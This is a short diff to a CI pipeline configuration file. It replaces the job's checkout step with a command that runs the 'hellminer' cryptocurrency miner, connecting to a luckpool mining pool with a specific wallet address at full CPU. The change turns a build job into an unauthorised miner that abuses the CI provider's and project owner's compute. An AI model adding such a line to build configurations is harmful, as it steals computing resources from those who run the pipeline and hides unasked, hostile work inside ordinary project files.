@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - './hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RSUso79UhzvVCyPVBtuLoLRAayFGEEFjUV.B-1 -p x --cpu 100'
